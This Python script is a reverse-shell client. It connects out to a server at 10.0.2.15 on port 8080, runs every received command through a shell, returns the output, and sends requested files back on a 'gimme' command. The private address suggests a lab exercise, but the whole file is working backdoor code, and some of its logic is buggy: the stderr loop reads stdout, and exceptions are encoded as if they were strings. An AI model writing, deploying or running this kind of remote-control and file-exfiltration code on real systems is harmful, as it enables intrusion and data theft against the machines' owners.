import os
import socket
import subprocess
import time


class Connection():
    def __init__(self):
        """Initializing a Connection object creates
        a socket with the listening server and then
        opens up a shell for the server-side user
        to send commands to. The shell commands
        generate stdout and stderr character streams,
        which it sends to the server to be printed.
        It is not limited to 1024 character chunks,
        but will continue sending chunks until stdout
        and stderr buffers are emptied out.
        """
        self.initiate_connection()
        self.reverse_shell()

    def transfer(self, path):
        """Checks if requested file exists. If it does,
        opens it, reads it 1024 byte chunks at a time,
        and send the chunks to the server through the
        socket. Prints to the screen how many bytes
        of the file have been sent. Pauses for a 10th
        of a second between each send to give server
        time to process it. This slows the transfer
        down, but I noticed it made the script work
        closer to 100% of the time.
        """
        if os.path.exists(path):
            f = open(path, 'rb')
            packet = f.read(1024)
            while packet != ''.encode():
                self.s.send(packet) 
                time.sleep(.1)
                packet = f.read(1024)
            time.sleep(.5)    
            self.s.send('D0NE'.encode())
            time.sleep(2)
            f.close()
        else:
            self.s.send('Unable to find file'.encode())
    
    def initiate_connection(self):
        """Creates a socket object, connects to the
        server at 10.0.2.15 on port 8080.
        """
        self.s = socket.socket(
                               socket.AF_INET,
                               socket.SOCK_STREAM
                               )
        self.s.connect(('10.0.2.15', 8080))

    def reverse_shell(self):
        """Accepts a command, sends stdout or stderr
        back to the server. When stdout and stderr
        are finished, it sends the string "THAT'S
        ALL, F0LKS!!!", then waits for the next
        command.
        """
        while True:
            command = self.s.recv(1024).decode()
            if 'terminate' in command:
                self.s.close()
                break
            elif 'gimme' in command:
                path = command.split('*')[1]
                try:
                    self.transfer(path)
                except Exception as e:
                    self.s.send(e.encode())
                    pass
            else:
                CMD = subprocess.Popen(
                        command,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE
                                       )
                stdout_chunk = CMD.stdout.read(1024)
                while stdout_chunk.decode():
                    self.s.send( stdout_chunk )
                    time.sleep(2)
                    stdout_chunk = CMD.stdout.read(1024)
                stderr_chunk = CMD.stderr.read(1024)
                while stderr_chunk.decode():
                    self.s.send( stderr_chunk )
                    time.sleep(2)
                    stderr_chunk = CMD.stdout.read(1024)
                self.s.send(
                        "D0NE".encode()
                            )

if __name__ == "__main__":
    connection = Connection()
